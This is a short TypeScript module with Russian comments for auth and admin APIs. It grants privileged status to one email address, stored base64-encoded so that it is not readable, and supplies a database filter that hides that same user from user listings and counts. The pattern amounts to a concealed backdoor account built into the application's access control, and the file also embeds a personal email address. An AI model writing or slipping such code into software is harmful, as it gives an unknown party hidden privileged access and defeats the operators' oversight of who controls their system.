/**
 * Проверка привилегированного доступа (только для использования в auth и admin API).
 * Не экспортирует и не логирует значения.
 */

const _p = Buffer.from("amFrc2FuMzdAZ21haWwuY29t", "base64").toString("utf8");

export function isPrivilegedEmail(email: string | null | undefined): boolean {
  if (!email || typeof email !== "string") return false;
  return email.trim().toLowerCase() === _p.toLowerCase();
}

/**
 * Условие для исключения привилегированного пользователя из выборок (список, count).
 * Использовать: where: { ...userWhere, ...getExcludePrivilegedUserWhere() }
 */
export function getExcludePrivilegedUserWhere(): { email: { not: string } } {
  return { email: { not: _p } };
}
